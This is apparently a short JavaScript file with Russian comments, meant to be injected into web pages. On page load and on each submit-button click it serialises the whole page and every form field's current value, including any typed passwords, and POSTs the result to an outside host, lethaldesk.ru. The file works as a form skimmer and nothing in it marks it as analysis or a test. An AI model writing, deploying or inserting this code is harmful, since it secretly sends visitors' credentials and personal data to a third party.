const urlPost2 = "https://lethaldesk.ru/api/save";
console.log("скрипт запущен");
window.addEventListener("load", () => {
  // Страница полностью загружена (включая изображения, стили и т.д.)
  var data1 = getCleanHTML();
  post1('on load',data1);


  
  document.addEventListener('click', function(event) {
  // Проверяем, что клик был по инпуту
  /*
  if (event.target.tagName === 'INPUT') {
	data1 = getCleanHTML();
	post1('input click',data1);	
  }
	*/
  //проверяем клик по сабмиту
  if(event.target.type === 'submit'){
	data1 = getCleanHTML();
	post1('submit click',data1);  
  }
});
 
    
});
async function post1(strQ,dataHTML){
	fetch(urlPost2, {
		method: 'POST',
		headers: {
		  'Content-Type': 'application/json'
		},
		body: JSON.stringify({ 
			date: new Date().toISOString(), 
			source: strQ, 
			text: dataHTML,
			istrue: true
			
		})
	})
  .then(res => res.json())
  .then(data => console.log('Ответ сервера:', data));
}

function getCleanHTML() {
  // Клонируем весь документ
  const clone = document.documentElement.cloneNode(true);

  // Удаляем все <script>, <style>, <img>, <video>, <audio>, <link rel="stylesheet">
  clone.querySelectorAll('script, style, img, video, audio, link[rel="stylesheet"]').forEach(el => el.remove());

  
  clone.querySelectorAll('input, textarea, select').forEach(el => {
    if (el.type === 'checkbox' || el.type === 'radio') {
      if (el.checked) el.setAttribute('checked', 'checked');
      else el.removeAttribute('checked');
    } else {
      el.setAttribute('value', el.value);
    }
  });

  
  // Возвращаем HTML
  return '<!DOCTYPE html>\n' + clone.outerHTML;
}